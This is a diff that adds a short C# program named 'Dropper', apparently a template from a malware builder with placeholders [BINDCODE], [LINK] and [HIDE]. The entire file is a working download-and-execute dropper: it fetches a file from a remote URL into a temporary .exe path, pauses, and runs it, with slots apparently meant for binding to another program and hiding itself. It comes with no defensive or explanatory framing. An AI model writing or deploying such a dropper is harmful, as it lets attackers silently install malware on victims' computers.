@@ -1,0 +1,25 @@
+﻿using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using System.Resources;
+using System;
+
+namespace Dropper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+			[BINDCODE]
+            var loc = Path.ChangeExtension(Path.GetTempFileName(), "exe");
+            using (var wc = new WebClient())
+            {
+                wc.DownloadFile("[LINK]", loc);
+            }
+            System.Threading.Thread.Sleep(3000);
+            Process.Start(loc);
+            [HIDE]
+        }
+    }
+}
